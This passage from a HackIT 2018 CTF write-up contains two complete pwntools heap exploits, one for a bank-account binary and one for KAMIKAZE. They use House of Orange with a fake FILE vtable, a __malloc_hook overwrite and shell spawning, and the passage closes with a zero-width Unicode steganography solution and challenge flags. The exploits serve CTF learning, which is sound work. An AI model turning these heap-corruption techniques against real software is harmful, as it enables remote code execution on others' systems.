	statement = sh.recvuntil("\n")
	sh.recvuntil("5. View your bank status\n")
	return (title[:len(title)-1],statement[:len(statement)-1])

tmp1 = create("1", 0x20, "1")
tmp2 = create("2", 0x20, "2")
delete(tmp1)
delete(tmp2)
#now 4 0x30 fastbin, ordered by 6903

fst4_0x30 = [0] * 4
for i in map(lambda x:x/3,[6,9,0,3]):
	fst4_0x30[i] = create(str(i), 0x50, str(i))
#consume the 0x30 chunks, put them in an array,
#idx correspond to memory position

#want allocation order 31 02
delete(fst4_0x30[2])
delete(fst4_0x30[0])
delete(fst4_0x30[1])
delete(fst4_0x30[3])

gen_unsorted = create("3", 0x20, "1")
create("0" * 0x10 + chr((0x90 + 0x60) | 1), 0x20, "2")

for i in xrange(0,3):
	create("leak", 0x50, "consume 0x60 chunks")
	#take all 0x50, 0x30 will be allocated from top chunk

toleak = create("leak", 0x50, "to become leak here")

delete(gen_unsorted)
#unsorted bin contains 1 2 3 0x60, and one 0x30 fastbin

arb_rw = create("leak", 0x10, "A") #0x30, 1
struct_overlap = create("leak", 0x30, "A") #2, jmp out 3
libc_addr = u64(view(toleak)[1] + "\x00\x00") - UNSORTED_OFF
create("leak", 0x20, "empty bins, leak pie")
flag_addr = u64(view(toleak)[1] + "\x00\x00") # - 0x202010
print hex(libc_addr)
print hex(flag_addr)
#now bins empty

# edit_statement(struct_overlap, "H" * 0x10 + p64(flag_addr) + p64(0x10) + p64(libc_addr+e.symbols["__free_hook"]))
# edit_statement(arb_rw, p64(libc_addr + e.symbols["system"]))

delete(struct_overlap)
create("arb read", 0x30, "H" * 0x10 + p64(flag_addr) + p64(0x10) + p64(libc_addr+e.symbols["environ"]))
stack_addr = u64(view(arb_rw)[1] + "\x00\x00")
print hex(stack_addr)

delete(struct_overlap)
create("arb write", 0x30, "H" * 0x10 + p64(flag_addr) + p64(0xdeadbeef) + p64(libc_addr + GLOBAL_MAX_FAST)) #to test
edit_statement(arb_rw, "1") #1 will let scanf return 1
#change max_global_fast to 0

#house of orange(by rewriting title size)
sh.recvuntil("Enter title of bank account: ")
sh.send("orange")
sh.recvuntil("Enter size of your bank statement: ")
sh.send(str(0x20) + "\n")
slp()
sh.send("house of orange" + "\n")
sh.recvuntil("Account has been created at index ")
of_chunk = int(sh.recvuntil("\n"))
sh.recvuntil("5. View your bank status\n")
hso_chunk = create("hso", 0x50, "house of orange")
create("pad", 0x10, "pad")
delete(of_chunk)

create("0" * 0x10 + chr(0xC0 | 1), 0x50, 'A' * 0x20 + p64(0) + p64(0x31) + p64(flag_addr) + chr(0))

fake_file = p64(0)
fake_file += p64(0x61)
fake_file += p64(1)
fake_file += p64(libc_addr + e.symbols["_IO_list_all"] - 0x10)
fake_file += p64(2) + p64(3)
fake_file += "\x00" * 8
fake_file += p64(libc_addr + next(e.search('/bin/sh\x00'))) #/bin/sh addr
fake_file += ((0xc0-0x40) / 8) * p64(flag_addr)
fake_file += p32(0) #mode
fake_file += (0xd8-0xc4) * "\x00"
fake_file += p64(libc_addr + IO_STR_FINISH - 0x18) #vtable_addr
fake_file += (0xe8-0xe0) * "\x00"
fake_file += p64(libc_addr + e.symbols["system"])

edit_title(hso_chunk, 'A' * 8 + fake_file)

sh.send("1\n")

sh.interactive()
```

However, the flag is `flag{Gu4rd_at_MALLOC_HOOK_bu1_n0t_4t_FREE_HOOK??}`, but I didn't use free hook at all, how can this pass the check of flag?

## 982 Pwn / KAMIKAZE ##

**Description**

> This app is the secret to Eminem's lyrical genuis. Wonder what other info is hidden in there.
> 
> `nc 185.168.131.14 6200`

**Files provided**

 - [kamikaze](files/kamikaze)

**Solution** (by [Mem2019](https://github.com/Mem2019))

The problem is here.

```c
//in create
read(0, v3->buf_0x10, 0x10uLL);            // no term
//in KAMIKAZE, which is a xor
for ( i = 0; i < strlen(v4->buf_0x10); ++i )
  v4->buf_0x10[i] ^= seed; // strlen may > 0x10 !
```

so we can change the size of next chunk.

However, it is restricted that `1 < seed <= 0xE`, so we can only change the least significat 4 bits; however, this is not related to size but is some bit flag. If we want to change the size, we must have chunk with `size > 0x100`, which cannot be allocated directly since only fast bin size is allowed. 

Thus, we need to construct an unsorted bin first by shrinking the size of top chunk. If the size required by `malloc` is larger than the top chunk, and there are chunks in fast bin free list, these fast bins will be consolidated into an unsorted bin.

Luckily, the top chunk size is `0x21000`, and after allocating some chunks, it will be `0x20XXX`, which can be shrinked if we xor it with 2, and at the same time the top chunk is still page aligned.

After having an unsorted bin chunk, we can extend the unsorted bin to leak the libc and rewrite the pointer in the struct to achieve arbitrary write.

Unlike the `Back Reimplemented` challenge, the `read` is used instead of `fgets`, so we can write 6 non-zero bytes if there are 6 non-zero bytes originally. What I did is to write the 0x70 fast bin list header in `main_arena` to `__malloc_hook - 0x23 ` (0x7f fast bin attack), thus rewriting the `__malloc_hook` to `one_gadget`

exp:

```python
from pwn import *

g_local=True
context.log_level='debug'

UNSORTED_OFF = 0x3c4b78
e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
if g_local:
	sh = process('./kamikaze')#env={'LD_PRELOAD':'./libc.so.6'}
	#gdb.attach(sh)
else:
	sh = remote("185.168.131.14", 6000)

def create(weight, data, size, short):
	sh.send("1\n")
	sh.recvuntil("the weight of the song: ")
	sh.send(str(weight) + "\n")
	sh.recvuntil("size of the stanza: ")
	sh.send(str(size) + "\n")
	sh.recvuntil("the stanza: ")
	sh.send(data + "\n")
	sh.recvuntil("a short hook for it too: ")
	sh.send(short)
	sh.recvuntil(">> ")

def edit(weight, data):
	sh.send("2\n")
	sh.recvuntil("song weight: ")
	sh.send(str(weight) + "\n")
	sh.recvuntil("new stanza: ")
	sh.send(data)
	sh.recvuntil(">> ")

def xor(weight, seed):
	sh.send("3\n")
	sh.recvuntil("song weight: ")
	sh.send(str(weight) + "\n")
	sh.recvuntil("seed: ")
	sh.send(str(seed) + "\n")
	sh.recvuntil(">> ")

def delete(weight):
	sh.send("4\n")
	sh.recvuntil("song weight: ")
	sh.send(str(weight) + "\n")
	sh.recvuntil(">> ")

def show(idx):
	sh.send("5\n")
	sh.recvuntil("song index: ")
	sh.send(str(idx) + "\n")
	sh.recvuntil("Weight: 0x")
	weight = sh.recvuntil("\n")
	sh.recvuntil("Stanza: ")
	buf = sh.recvuntil("\n")
	sh.recvuntil(">> ")
	return (int(weight, 16), buf[:len(buf)-1])

create(0, "A", 0x70, "P" * 0x10)
create(1, "A", 0x30, "P")
for i in xrange(2,5):
	create(i, "A", 0x20, "P")
for i in xrange(2,5):
	delete(i)
#prepare many 0x20 fastbin chunks
#so that 0x70 will be adjacent

for i in xrange(2,21):
	if i != 9:
		create(i, str(i), 0x70, "P" * 0x10)
	else:#fake a chunk here, for unsorted bin
		create(i, "9" * 0x10 + p64(0) + p64(0x61), 0x70, "P" * 0x10)
create(21, "A", 0x20, "P" * 0x10)
delete(21)
delete(1)

# topchunk size = 0x20171
# 0x30: 0x5555557570b0 -> 0x555555757e30 -> 0x555555757e60 -> 0x0
# 0x40: 0x5555557570e0 -> 0x0

create(1, "A", 0x20, "P")
create(21, "A", 0x30, "P" * 0x10)

xor(21, 0x02)
xor(21, 0x02)
#topchunk size = 0x171

for i in xrange(2,6):
	delete(i)
#delete some 0x70+0x30 fastbins

for i in xrange(2,6):
	create(i, "A", 0x60, "P")
delete(2)
delete(3)
create(2, "consume 0x30", 0x20, "A")
#0x191 unsorted bin
#2 0x70 fastbin

create(22, "leak", 0x60, "P" * 0x10)
#0x161 unsorted bin
xor(22, 1 ^ 3)
#0x363 unsorted bin

create(23, "consume", 0x70, "0xb0")
create(24, "consume", 0x70, "0xb0")

libc_addr = u64(show(1)[1] + "\x00\x00") - 0x3c4b78
print hex(libc_addr)

create(25, "consume", 0x70, "0xb0")

create(26, "A" * 0x18 + p64(0x31) + p64(2019) + p64(libc_addr + 0x3c4b50) + p64(0), 0x70, "overlap")

edit(2019, p64(libc_addr + e.symbols["__malloc_hook"] - 3 - 0x20)[:6])

create(27, "A" * 0x13 + p64(libc_addr + 0xf02a4), 0x60, "edit")
sh.send("1\n")
sh.interactive()
```

However, the flag is `flag{D0n1_4lw4ys_trU5t_CALLOC_1ts_w3ird_lol}`, but I think my solution also works with `malloc`, so I've got unexpected solution for all 3 heap pwns XD

## 1 Welcome / Get Going ##

**Description**

> [Welcome](https://ctf.hackit.ua/w31c0m3)

**No files provided**

**Solution**

The page displays:

```
Welcome to the HackIT 2018 CTF, flag is somewhere here. ¯_(ツ)_/¯
```

But if we open up the inspector, it shows a whole bunch of invisible Unicode characters between the first and the second characters. Zero-width joiners, zero-width non-joiners, etc. In fact, all the invisible characters used are (Unicode codepoints): `0x200b`, `0x200c`, `0x200d`, `0x200e`, `0x200f`.

A quick search for e.g. "zero-width unicode steganography" leads us to [this page](https://330k.github.io/misc_tools/unicode_steganography.html) which does basically the same thing as what we need. The character selection doesn't include one of the codepoints that is used in the challenge; fortunately, the library which the page uses is [available](http://330k.github.io/misc_tools/unicode_steganography.js).

Then we can simply decode the flag with Javascript:

```js
const stego = require("./unicode_steganography.js").unicodeSteganographer;
stego.setUseChars('\u200b\u200c\u200d\u200e\u200f');
console.log(stego.decodeText("W​​​​‏​‍​​​​‏‌‎​​​​‎‏‍​​​​‏​‎​​​​‏‏‎​​​​‏‎‏​​​​‍​‌​​​​‎‏​​​​​‏​‎​​​​‏‍‏​​​​‍​‌​​​​‍​‌​​​​‍‌​​​​​‎‏​​​​​‏​‏​​​​‍​‍​​​​‎‏‏​​​​‏‌‍​​​​‍​‌​​​​‏‍‏​​​​‏‏‍​​​​‎‏​​​​​‏‎‏​​​​‌‏‏​​​​‏‎‌​​​​‏​‏​​​​‎‏​​​​​‏‎‍​​​​‏‍​​​​​‌‏‏​​​​‎‏‏​​​​‌‏‎​​​​‏​​​​​​‍​‌​​​‌​​​elcome to the HackIT 2018 CTF, flag is somewhere here. ¯_(ツ)_/¯"));
```

`flag{w3_gr337_h4ck3rz_w1th_un1c0d3}`
